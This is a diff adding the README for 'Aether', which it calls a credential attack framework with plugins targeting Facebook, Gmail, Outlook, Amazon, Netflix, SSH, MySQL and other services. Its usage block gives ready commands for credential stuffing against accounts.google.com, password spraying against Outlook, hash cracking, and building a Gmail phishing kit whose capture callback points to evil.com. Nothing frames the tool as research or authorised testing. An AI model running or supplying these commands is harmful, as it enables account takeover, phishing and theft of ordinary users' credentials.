@@ -1,0 +1,35 @@
+# Aether
+
+Complete credential attack framework with 20+ plugins.
+
+## Plugins Included
+
+**Social Media:**
+- Facebook, Instagram, Twitter/X, LinkedIn, TikTok, Reddit, Discord
+
+**Email:**
+- Gmail, Outlook, Yahoo, ProtonMail, iCloud
+
+**Other Sites:**
+- Amazon, Netflix, Spotify, GitHub
+
+**Protocols:**
+- SSH, MySQL, PostgreSQL, FTP, SMTP
+
+## Usage
+
+```bash
+# Install
+pip install -r requirements.txt
+
+# Credential stuffing
+python -m aether stuff -p gmail -t accounts.google.com -c combos.txt
+
+# Password spray
+python -m aether spray -p outlook -u users.txt -w passwords.txt
+
+# Crack hashes
+python -m aether crack --hash-file hashes.txt -a sha256
+
+# Generate phishing kit
+python -m aether phish --template gmail --callback https://evil.com/capture
